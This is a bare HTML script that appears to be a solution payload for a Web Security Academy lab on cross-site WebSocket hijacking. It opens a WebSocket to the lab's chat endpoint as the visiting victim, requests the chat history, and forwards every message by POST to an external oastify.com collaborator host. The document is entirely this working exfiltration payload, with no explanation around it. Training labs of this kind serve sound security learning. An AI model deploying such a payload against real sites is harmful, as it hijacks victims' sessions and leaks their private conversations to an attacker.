<script>
    var ws = new WebSocket('wss://0a8300a1032c1105803e0a5f003900b4.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://el3uxfz4xdx638s3z594hkvw3n9ex4lt.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };



</script>